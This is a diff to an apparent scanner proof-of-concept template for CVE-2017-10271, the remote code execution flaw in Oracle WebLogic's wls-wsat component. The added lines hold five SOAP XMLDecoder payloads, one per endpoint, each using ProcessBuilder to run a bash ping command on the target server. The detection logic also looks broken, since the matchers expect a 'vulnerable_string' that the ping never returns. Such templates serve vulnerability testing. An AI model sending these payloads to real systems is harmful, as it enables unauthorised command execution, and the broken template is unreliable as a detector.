@@ -1,43 +1,37 @@
 [info]
 author = "ave"
-description = "通过向 /wls-wsat/CoordinatorPortType 发送特制 SOAP XML 数据包，利用 XMLDecoder 反序列化漏洞使服务器回显随机字符串，检测响应中是否包含该字符串以判断漏洞是否存在"
+description = "Oracle WebLogic Server wls-wsat 组件 XMLDecoder 反序列化远程代码执行漏洞验证"
 id = "POC-AVE-2017-0200"
-name = "Oracle WebLogic Server XMLDecoder反序列化远程代码执行漏洞 PoC"
+name = "CVE-2017-10271 PoC"
 severity = "high"
-tags = [
-    "cve-2017-10271",
-    "weblogic",
-    "rce",
-    "deserialization",
-]
+tags = ["ave-2017-0200"]
 vuln_id = [
     "CVE-2017-10271",
     "AVE-2017-0200",
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "POST"
-path = "/{{BaseURL}}/wls-wsat/CoordinatorPortType"
+path = "/wls-wsat/CoordinatorPortType"
 protocol = "http"
 
 [poc.requests.body]
 content = """
+<?xml version="1.0" encoding="utf-8"?>
 <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
   <soapenv:Header>
     <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
-      <java>
-        <void class="java.lang.Thread" method="currentThread">
-          <void method="getCurrentWork">
-            <void method="getResponse">
-              <void method="getServletOutputStream">
-                <void method="flush"/>
-              </void>
-              <void method="getWriter"><void method="write"><string>{{randstr}}</string></void></void>
-            </void>
-          </void>
+      <java version="1.4.0" class="java.beans.XMLDecoder">
+        <void class="java.lang.ProcessBuilder">
+          <array class="java.lang.String" length="3">
+            <void index="0"><string>/bin/bash</string></void>
+            <void index="1"><string>-c</string></void>
+            <void index="2"><string>ping -c 1 {{interactsh-url}}</string></void>
+          </array>
+          <void method="start"/>
         </void>
       </java>
     </work:WorkContext>
@@ -50,9 +44,136 @@ type = "raw"
 expect = true
 part = "body"
 type = "word"
-words = ["{{randstr}}"]
+words = ["vulnerable_string"]
+
+[[poc.requests]]
+method = "POST"
+path = "/wls-wsat/CoordinatorPortType11"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<?xml version="1.0" encoding="utf-8"?>
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+  <soapenv:Header>
+    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+      <java version="1.4.0" class="java.beans.XMLDecoder">
+        <void class="java.lang.ProcessBuilder">
+          <array class="java.lang.String" length="3">
+            <void index="0"><string>/bin/bash</string></void>
+            <void index="1"><string>-c</string></void>
+            <void index="2"><string>ping -c 1 {{interactsh-url}}</string></void>
+          </array>
+          <void method="start"/>
+        </void>
+      </java>
+    </work:WorkContext>
+  </soapenv:Header>
+  <soapenv:Body/>
+</soapenv:Envelope>"""
+type = "raw"
 
 [[poc.requests.matchers]]
 expect = true
-status = [200]
-type = "status"
+part = "body"
+type = "word"
+words = ["vulnerable_string"]
+
+[[poc.requests]]
+method = "POST"
+path = "/wls-wsat/ParticipantPortType"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<?xml version="1.0" encoding="utf-8"?>
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+  <soapenv:Header>
+    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+      <java version="1.4.0" class="java.beans.XMLDecoder">
+        <void class="java.lang.ProcessBuilder">
+          <array class="java.lang.String" length="3">
+            <void index="0"><string>/bin/bash</string></void>
+            <void index="1"><string>-c</string></void>
+            <void index="2"><string>ping -c 1 {{interactsh-url}}</string></void>
+          </array>
+          <void method="start"/>
+        </void>
+      </java>
+    </work:WorkContext>
+  </soapenv:Header>
+  <soapenv:Body/>
+</soapenv:Envelope>"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["vulnerable_string"]
+
+[[poc.requests]]
+method = "POST"
+path = "/wls-wsat/RegistrationPortTypeRPC"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<?xml version="1.0" encoding="utf-8"?>
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+  <soapenv:Header>
+    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+      <java version="1.4.0" class="java.beans.XMLDecoder">
+        <void class="java.lang.ProcessBuilder">
+          <array class="java.lang.String" length="3">
+            <void index="0"><string>/bin/bash</string></void>
+            <void index="1"><string>-c</string></void>
+            <void index="2"><string>ping -c 1 {{interactsh-url}}</string></void>
+          </array>
+          <void method="start"/>
+        </void>
+      </java>
+    </work:WorkContext>
+  </soapenv:Header>
+  <soapenv:Body/>
+</soapenv:Envelope>"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["vulnerable_string"]
+
+[[poc.requests]]
+method = "POST"
+path = "/wls-wsat/RegistrationRequesterPortType"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<?xml version="1.0" encoding="utf-8"?>
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+  <soapenv:Header>
+    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+      <java version="1.4.0" class="java.beans.XMLDecoder">
+        <void class="java.lang.ProcessBuilder">
+          <array class="java.lang.String" length="3">
+            <void index="0"><string>/bin/bash</string></void>
+            <void index="1"><string>-c</string></void>
+            <void index="2"><string>ping -c 1 {{interactsh-url}}</string></void>
+          </array>
+          <void method="start"/>
+        </void>
+      </java>
+    </work:WorkContext>
+  </soapenv:Header>
+  <soapenv:Body/>
+</soapenv:Envelope>"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["vulnerable_string"]
